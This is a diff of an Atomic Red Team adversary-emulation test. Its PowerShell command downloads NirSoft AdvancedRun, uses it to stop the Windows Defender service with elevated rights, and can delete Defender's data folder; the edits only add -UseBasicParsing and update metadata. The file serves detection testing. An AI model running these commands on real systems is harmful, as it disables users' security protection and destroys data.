@@ -19,11 +19,12 @@
         command: 'if(Test-Path -Path "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"; Expand-Archive
-          -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath
-          "PathToAtomicsFolder\..\ExternalPayloads\" -Force; fi; Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe"
-          /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine
-          "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}; if(#{delete_defender_folder}){;
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -UseBasicParsing;
+          Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
+          -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force; fi;
+          Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename
+          "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend"
+          /StartDirectory "" /RunAs 8 /Run} Catch{}; if(#{delete_defender_folder}){;
           $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse;
           Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename
           "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState
@@ -40,8 +41,8 @@
   privilege: ''
   buckets:
   - defense-impairment
-  - atomic-red-team
   - t1685
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -65,7 +66,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile
-        "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
+        "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -UseBasicParsing
 
         Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
         -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
@@ -73,4 +74,4 @@
         '
     technique_created: '2026-04-14T22:53:26.949Z'
     atomic_guid: 81ce22fd-9612-4154-918e-8a1f285d214d
-    import_timestamp: '2026-10-20T07:08:29.862887Z'
+    import_timestamp: '2026-10-21T07:01:51.839994Z'
